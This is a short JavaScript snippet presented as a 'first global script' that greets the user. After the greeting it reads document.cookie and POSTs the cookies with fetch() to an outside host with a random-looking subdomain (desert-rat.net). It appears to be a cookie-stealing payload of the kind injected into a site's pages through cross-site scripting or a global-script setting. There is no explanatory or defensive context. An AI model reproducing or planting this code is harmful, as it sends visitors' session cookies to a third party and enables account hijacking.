console.log('Hello from your first global script!');
alert('Hello from your first global script!');
console.log(document.cookie);
console.log(document.domain);

let data = document.cookie;

fetch("https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net", {
  method: "POST",
  body: data,
});
  //.then((response) => response.json())
  //.then((json) => console.log(json));